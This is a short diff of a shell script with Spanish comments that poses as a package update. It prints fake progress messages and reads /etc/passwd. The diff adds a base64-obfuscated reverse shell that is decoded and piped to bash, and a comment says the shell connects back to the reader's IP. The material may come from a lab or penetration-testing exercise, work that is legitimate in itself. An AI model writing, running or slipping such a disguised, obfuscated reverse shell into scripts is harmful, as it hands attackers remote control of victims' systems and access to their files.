@@ -8,7 +8,7 @@ cat /etc/passwd | head -n 5
 echo "Procesando paquetes..."
 
 # Ejecutamos la reverse shell hacia TU IP (192.168.1.109)
-echo "bash -i >& /dev/tcp/$IP_ATACANTE/$PUERTO 0>&1 &" | base 64
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8kMS80NDQ0IDA+JjEgJm==" | base64 -d | bash
 
 sleep 2
 echo "Actualización completada."
